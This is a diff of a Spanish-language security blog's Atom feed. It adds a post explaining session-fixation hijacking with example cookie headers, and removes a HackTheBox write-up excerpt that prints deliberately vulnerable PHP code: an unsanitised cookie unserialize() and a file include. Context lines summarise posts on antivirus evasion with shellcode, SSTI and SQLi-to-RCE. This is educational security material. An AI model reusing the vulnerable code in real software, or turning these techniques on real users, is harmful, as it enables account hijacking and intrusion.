@@ -1,4 +1,109 @@
-<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-01T11:31:07-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</subtitle><entry><title type="html">Simple XSS reflejado en un sitio web real</title><link href="http://localhost:4000/xxs-reflejado/" rel="alternate" type="text/html" title="Simple XSS reflejado en un sitio web real" /><published>2023-06-28T00:00:00-06:00</published><updated>2023-06-28T00:00:00-06:00</updated><id>http://localhost:4000/xxs-reflejado</id><content type="html" xml:base="http://localhost:4000/xxs-reflejado/">&lt;p&gt;Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="http://localhost:4000/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-05T13:32:56-06:00</updated><id>http://localhost:4000/</id><title type="html">c4rta</title><subtitle>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</subtitle><entry><title type="html">Un Poco de Pentesting - Session Fixation</title><link href="http://localhost:4000/UPDP-session-fixation/" rel="alternate" type="text/html" title="Un Poco de Pentesting - Session Fixation" /><published>2023-07-05T00:00:00-06:00</published><updated>2023-07-05T00:00:00-06:00</updated><id>http://localhost:4000/UPDP-session-fixation</id><content type="html" xml:base="http://localhost:4000/UPDP-session-fixation/">&lt;p class=&quot;lead&quot;&gt;Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona&lt;/p&gt;
+
+&lt;h2 id=&quot;sesiones&quot;&gt;Sesiones&lt;/h2&gt;
+
+&lt;p&gt;De acuerdo a google las sesiones son:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Una sesion de un grupo de interacciones del usuario con un sitio web que tienen lugar dentro de un marco de tiempo determinado, Por ejemplo, una sola sesion puede contener varias vistas de pagina, eventos, interacciones sociales y transacciones de comercio electronico.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/jYib9rNgrLOavCGfEaMPqJNOIf6cN5aHqsZpXAKPP1IVOUM3iFImIIxMW_AnWHlI5xKJ=w1100&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;center&gt;Imagen de: Google Analytics&lt;/center&gt;
+
+&lt;p&gt;Y es correcto, en una sesion se puede almacenar informacion sobre lo que un usuario hizo en un sitio web, ademas cabe recalcar que la sesion se crea una vez que primero el usuario se haya autenticado en el sitio web, por lo regular duran 30 minutos o hasta media noche (esto puede varias si el programador lo desea)&lt;/p&gt;
+
+&lt;h3 id=&quot;session-authentication&quot;&gt;Session Authentication&lt;/h3&gt;
+
+&lt;p&gt;La autenticacion basada en sesiones es un metodo para crear una sesion para cada usuario que se haya autenticado donde se almacenada informacion del lado del servidor en un “session ID”.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Funciona de esta manera:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;El cliente envia una solicitud de inicio de sesion o alguna informacion que pida&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El servidor autentica al usuario, crea una sesion que contendra la informacion de inicio de sesion u otra que haya pedido (se almacena en la base de datos y devuelve un session ID)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El cliente cuando vuelva a conectarse envia el sessionID en los encabezados de peticion&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El servidor comprueba si el sessionID que le envio el cliente tiene informacion valida, en caso de que sea exitoso el servidor web autentica el usuario&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Ejemplos de encabezados HTTP:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Encabezado de respuesta&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  HTTP/1.1 200 OK
+  Content-Type: text/html
+  Set-Cookie: &lt;span class=&quot;nv&quot;&gt;SESSIONID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;identificador_de_sesion
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+    &lt;p&gt;Observa como a travez del header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; el servidor le asigno al usuario una sesion con su identificacion&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Encabezado de peticion&lt;/p&gt;
+
+    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  GET /recurso HTTP/1.1
+  Host: ic4rta.github.io
+  Cookie: &lt;span class=&quot;nv&quot;&gt;SESSIONID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;identificador_de_sesion
+&lt;/code&gt;&lt;/pre&gt;
+    &lt;/div&gt;
+    &lt;p&gt;Observa que cuando se hace una peticion, en el header &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie&lt;/code&gt; se le debe de indicar el session ID con su identificador&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;session-fixation&quot;&gt;Session Fixation&lt;/h2&gt;
+
+&lt;p&gt;El session fixation es una tecnica donde se obliga a usar a la victima a usar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session ID&lt;/code&gt; creado por el atacante con el fun de que la victima se autentique usando ese mismo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session ID&lt;/code&gt;, y el atacante pueda usar ese mismo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session ID&lt;/code&gt; para iniciar sesion como si fuera la victima.
+Y ya con esto el atacante pudo robar/secuestrar la sesion de la victima&lt;/p&gt;
+
+&lt;p&gt;Algunas consideraciones son que:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;El atacante cree un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;session ID&lt;/code&gt; valido&lt;/li&gt;
+  &lt;li&gt;El ataque comienza antes de que la victima inicie sesion en el sitio web&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ejemplo&quot;&gt;Ejemplo&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://compsecurityconcepts.files.wordpress.com/2013/11/session-fixation.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;center&gt;Imagen de: IT Security Concepts Wordpress&lt;/center&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;El atacante inicia sesión en el banco&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El servidor a travez de los encabezados de respuesta le asigna un session ID el cual es válido (session ID: 2435345)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El atacante le envía una URL a la víctima con el session ID que generó el atacante&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;La víctima entra a la URL&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;La víctima se auténtica usando el session ID del atacante(session ID: 2435345) e inicia sesión usando sus credenciales, y ahora ese session ID ya tiene información de la sesión de la víctima (las credenciales en este caso, pero puede tener más cosas)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El atacante puede usar ese session ID para iniciar sesión en la cuenta de la víctima&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Referencias:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-community/attacks/Session_fixation&quot;&gt;https://owasp.org/www-community/attacks/Session_fixation&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/&quot;&gt;https://secureteam.co.uk/articles/web-application-security-articles/understanding-session-fixation-attacks/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>c4rta</name></author><category term="Session Fixation" /><summary type="html">Te explicare como funciona el ataque Session Fixation con el que podremos robar/secuestrar la sesion de otra persona</summary></entry><entry><title type="html">Simple XSS reflejado en un sitio web real</title><link href="http://localhost:4000/xxs-reflejado/" rel="alternate" type="text/html" title="Simple XSS reflejado en un sitio web real" /><published>2023-06-28T00:00:00-06:00</published><updated>2023-06-28T00:00:00-06:00</updated><id>http://localhost:4000/xxs-reflejado</id><content type="html" xml:base="http://localhost:4000/xxs-reflejado/">&lt;p&gt;Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real&lt;/p&gt;
 
 &lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;Este no es ningun writeup, pero te voy a mostrar como encontre de casualidad una vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS reflejado&lt;/code&gt; en un sitio web real, cabe recalcar que la vulnerabilidad ya la reporte, y no estoy promoviendo explotar vulnerabilidades en entornos reales, y simplemente te voy a dar la idea de algo que podria hacer alguien con malas intenciones, que este no es el caso, y espero que el tuyo tampoco&lt;/strong&gt;&lt;/p&gt;
 
@@ -803,7 +908,7 @@ le&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/jupiter/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="SQL injection" /><category term="Movimiento Lateral" /><summary type="html">Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp</summary></entry><entry><title type="html">Bypass AV - shellcode via Fiber injection + Timming attack</title><link href="http://localhost:4000/maldev-bypassAV-fiberInjection/" rel="alternate" type="text/html" title="Bypass AV - shellcode via Fiber injection + Timming attack" /><published>2023-06-16T00:00:00-06:00</published><updated>2023-06-16T00:00:00-06:00</updated><id>http://localhost:4000/maldev-bypassAV-fiberInjection</id><content type="html" xml:base="http://localhost:4000/maldev-bypassAV-fiberInjection/">&lt;p class=&quot;lead&quot;&gt;Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/jupiter/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="SQL injection" /><category term="Movimiento Lateral" /><summary type="html">Descubriremos un subdomino el cual hace uso de grafana y su API, para la intrusion haremos un SQLi a RCE usando un ruta de la API para realizar consultar, despues haremos movimiento lateral mediante un archivo YAML, despues otro movimiento lateral usando Jupyter el cual nos permitira ejecutar comando y mandarnos una rev shell, y para root abusaremos de un binario donde le indicaremos que descargue el archivo de la flag y lo guarde en un directorio dentro de /tmp</summary></entry><entry><title type="html">Bypass AV - shellcode via Fiber injection + Timming attack</title><link href="http://localhost:4000/maldev-bypassAV-fiberInjection/" rel="alternate" type="text/html" title="Bypass AV - shellcode via Fiber injection + Timming attack" /><published>2023-06-16T00:00:00-06:00</published><updated>2023-06-16T00:00:00-06:00</updated><id>http://localhost:4000/maldev-bypassAV-fiberInjection</id><content type="html" xml:base="http://localhost:4000/maldev-bypassAV-fiberInjection/">&lt;p class=&quot;lead&quot;&gt;Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack&lt;/p&gt;
 
 &lt;p&gt;Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de algunos antivirus de antiscan.me, y como evadir el windows defender, para esto use 3 cosas&lt;/p&gt;
 
@@ -2273,7 +2378,7 @@ _start:
 
 &lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html">Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh</summary></entry><entry><title type="html">Un Poco de Pentesting Web - SSTI en Jinja2</title><link href="http://localhost:4000/UPDPW-ssti/" rel="alternate" type="text/html" title="Un Poco de Pentesting Web - SSTI en Jinja2" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-05-29T00:00:00-06:00</updated><id>http://localhost:4000/UPDPW-ssti</id><content type="html" xml:base="http://localhost:4000/UPDPW-ssti/">&lt;p class=&quot;lead&quot;&gt;Te explicare como funciona la vulnerabilidad SSTI, sus payloads y como explotarla&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/shellcode/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="MalDev" /><summary type="html">Veremos a como puedes crear shellcodes, te enseñare como crear una usando la syscall write() y otra usando execve() para ejecutar bin/sh</summary></entry><entry><title type="html">Un Poco de Pentesting - SSTI en Jinja2</title><link href="http://localhost:4000/UPDP-ssti/" rel="alternate" type="text/html" title="Un Poco de Pentesting - SSTI en Jinja2" /><published>2023-05-29T00:00:00-06:00</published><updated>2023-05-29T00:00:00-06:00</updated><id>http://localhost:4000/UPDP-ssti</id><content type="html" xml:base="http://localhost:4000/UPDP-ssti/">&lt;p class=&quot;lead&quot;&gt;Te explicare como funciona la vulnerabilidad SSTI, sus payloads y como explotarla&lt;/p&gt;
 
 &lt;h2 id=&quot;flask-y-jinja&quot;&gt;Flask y Jinja&lt;/h2&gt;
 
@@ -2806,321 +2911,4 @@ $&apos;http://127.0.0.1:8000/flash/addcrypted2&apos;
 
 &lt;p&gt;Y listo, esto es todo, gracias por leer ❤&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/PC/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="SQL injection" /><category term="gRPC" /><summary type="html">Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.</summary></entry><entry><title type="html">HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID</title><link href="http://localhost:4000/htb-toxic/" rel="alternate" type="text/html" title="HackTheBox Toxic - LFI to RCE via Log Poisoning y Insecure Deserialization en PHPSESSID" /><published>2023-05-22T00:00:00-06:00</published><updated>2023-05-22T00:00:00-06:00</updated><id>http://localhost:4000/htb-toxic</id><content type="html" xml:base="http://localhost:4000/htb-toxic/">&lt;p&gt;En este desafio primero tenemos una deserializacion insegura en la cookie PHPSESSID la cual nos permitira un LFI, despues mediante Log Poisoning conseguiremos un RCE en el User-Agent.&lt;/p&gt;
-
-&lt;p class=&quot;lead&quot;&gt;Al ingresar a la web no podemos ver nada interesante a primera vista, tampoco al mostrar su codigo fuente, asi que nos decargaremos los archivos que nos proporciona HTB&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;├── index.html
-├── index.php
-├── models
-│   └── PageModel.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;h2 id=&quot;insecure-deserialization&quot;&gt;Insecure deserialization&lt;/h2&gt;
-
-&lt;p&gt;Contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;spl_autoload_register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/Model$/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;models/${name}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;${name}.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PageModel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/www/index.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;nb&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-        &lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-        &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; 
-        &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
-        &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
-
-&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;La primera parte del codigo:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;spl_autoload_register(function ($name){
-    if (preg_match(&apos;/Model$/&apos;, $name))
-    {
-        $name = &quot;models/${name}&quot;;
-    }
-    include_once &quot;${name}.php&quot;;
-});
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Con la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include_once&lt;/code&gt; esta incluyendo un archivo con la extension .php de la carpeta Models en tiempo de ejecucion, es decir cuando se ejecute este script de PHP&lt;/p&gt;
-
-&lt;p&gt;Despues, en esta parte:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (empty($_COOKIE[&apos;PHPSESSID&apos;]))
-{
-    $page = new PageModel;
-    $page-&amp;gt;file = &apos;/www/index.html&apos;;
-
-    setcookie(
-        &apos;PHPSESSID&apos;, 
-        base64_encode(serialize($page)), 
-        time()+60*60*24, 
-        &apos;/&apos;
-    );
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Primero hace una validacion si la cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; esta vacia&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;La cookie PHPSESSID permite a los sitios web almacenar datos serializados
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;En caso de que este vacia devuelve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, despues se crea una instancia de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PageModel&lt;/code&gt; llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;page&lt;/code&gt; donde se configura el atributo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; con el valor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/www/index.html&lt;/code&gt; (la pagina que vemos al entrar al sitio):&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$page = new PageModel;
-    $page-&amp;gt;file = &apos;/www/index.html&apos;;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Despues se establece la cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; con el valor serializado de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;setcookie(
-        &apos;PHPSESSID&apos;, 
-        base64_encode(serialize($page)), 
-        time()+60*60*24, 
-        &apos;/&apos;
-    );
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;La ultima parte del codigo es donde se encuentra la vulnerabilidad Insecure Deserialization:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$cookie = base64_decode($_COOKIE[&apos;PHPSESSID&apos;]);
-unserialize($cookie);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Basicamente en la ultima linea:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unserialize($cookie);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Se intenta deserializar y recuperar el valor de la cookie sin ningun tipo de sanitizacion, debido a esto nosotros podemos manipular el valor de la cookie para ingresar una cadena serializada maliciosa que haga lo que queramos.&lt;/p&gt;
-
-&lt;p&gt;(si quieres saber mas sobre Insecure Deserialization puedes leer &lt;a href=&quot;https://redfoxsec.com/blog/insecure-deserialization-in-php/&quot;&gt;aqui&lt;/a&gt;)&lt;/p&gt;
-
-&lt;h2 id=&quot;local-file-inclusion&quot;&gt;Local FIle Inclusion&lt;/h2&gt;
-
-&lt;p&gt;(si quieres saber como funciona LFI, puedes leer un post de mi compa &lt;a href=&quot;https://droix3d.github.io/posts/LocalFileInclusion/&quot;&gt;droix3d&lt;/a&gt; que lo explica muy bien)&lt;/p&gt;
-
-&lt;p&gt;Hace un momento dije que estaba incluyendo un archivo de la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Models&lt;/code&gt;. En los archivo que nos descargamos de HTB esta ese archivo, pasaremos a verlo:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PageModel&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
-    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Primeramente vemos la clase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PageModel&lt;/code&gt; que se instancia en el otro archivo que explique, ademas tiene un atributo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, y la parte vulnerable a LFI es lo de abajo:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function __destruct() 
-    {
-        include($this-&amp;gt;file);
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
